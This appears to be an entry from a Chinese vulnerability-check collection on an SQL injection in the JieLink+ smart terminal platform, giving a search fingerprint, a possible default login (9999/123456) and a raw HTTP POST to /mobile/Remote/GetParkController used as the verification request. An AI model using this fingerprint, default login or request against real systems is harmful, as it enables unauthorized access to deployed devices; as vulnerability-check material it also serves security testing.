﻿# JieLink+智能终端操作平台 SQL注入

> 更新时间：2024-01-19

> 漏洞编号：

> 漏洞说明：可能存在默认账号：9999 密码：123456

> 漏洞特征：title=="JieLink+智能终端操作平台"

> 验证脚本：HTTP

```
POST /mobile/Remote/GetParkController HTTP/1.1
Accept: application/json, text/plain
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
 
deviceId=1
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：


> 验证文件来源：JieLink+智能终端操作平台 SQL注入.poc
